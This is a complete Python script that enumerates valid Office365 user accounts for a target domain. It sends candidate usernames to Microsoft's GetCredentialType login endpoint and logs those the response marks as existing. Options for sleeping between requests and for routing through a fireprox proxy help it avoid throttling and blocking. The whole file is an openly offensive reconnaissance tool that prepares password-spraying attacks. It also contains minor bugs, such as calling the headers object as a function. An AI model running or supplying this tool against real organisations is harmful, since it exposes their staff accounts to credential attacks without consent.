#!/usr/bin/env python3

import requests
import sys
import argparse
import uuid
from time import sleep
from string import Template


def Spray(domain, users, target_url, output_file, wait, verbose, more_verbose):

	i = 0
	results = []


	if verbose or more_verbose:
		print("Targeting: " + target_url + "\n")

	for user in users:
		if more_verbose:
			print("\ntesting " + user)

		body = '{"Username": "%s@%s"}' % (user, domain)
		r = requests.post(target_url, data=body)
		
		#print(target_url)

		if more_verbose:
			print("Status: " + str(r.status_code))
			print(r.headers)
			print(r.text)

		if 'ThrottleStatus' in r.headers.keys():
			print("Throttling detected => ThrottleStatus: " + r.headers('ThrottleStatus'))

		if '"IfExistsResult":0' in r.content.decode('UTF-8'):
			output_file.write(user + "@" + domain +" - VALID\n")
			if verbose or more_verbose:
				print("Found " + user + "@" + domain)
			continue
		
		sleep(wait)
		i = i + 1
		if i % 50 == 0:
			print("Tested " + str(i) + " possible users")

		
	return results

def main():

	parser = argparse.ArgumentParser(description="Enumerate users against Office365")

	target_group = parser.add_argument_group(title="Attack Target")
	target_group.add_argument('-d', dest='domain', type=str, help='Target domain - required')
	target_group.add_argument('-l', dest='user_list', type=argparse.FileType('r'), help='File with list of target usernames (without domain)')
	target_group.add_argument('-u', '--url', type=str, dest='url', help='Target URL if using something like fireprox; otherwise will directly call the O365 login endpoint')
	target_group.add_argument('-w', '--wait', type=int, dest='wait', help='Number of seconds to sleep between individual user attempts', default=0)

	parser.add_argument('-v', '--verbose', action='store_true', dest='verbose', default=False)
	parser.add_argument('-vv', '--more-verbose', action='store_true', dest='more_verbose', default=False)

	parser.add_argument('-o', '--output', type=argparse.FileType('w'), dest='output_file', default='spray_results.txt', help='Output file for results (txt). Default is spray_results.txt')

	args = parser.parse_args()

	if not args.domain:
		parser.print_help()
		print('\nNo target domain provided')
		sys.exit()

	if not args.user_list:
		parser.print_help()
		print('\nNo list of target users provided')
		sys.exit()

	if not args.url:
		target_url = 'https://login.microsoftonline.com/common/GetCredentialType'
	else:
		target_url = args.url + 'common/GetCredentialType'

	
	users = []

	for line in args.user_list:
		users.append(line.split('@')[0].strip())
		

	results = Spray(args.domain, users, target_url, args.output_file, args.wait, args.verbose, args.more_verbose)	


if __name__ == '__main__':
	main()
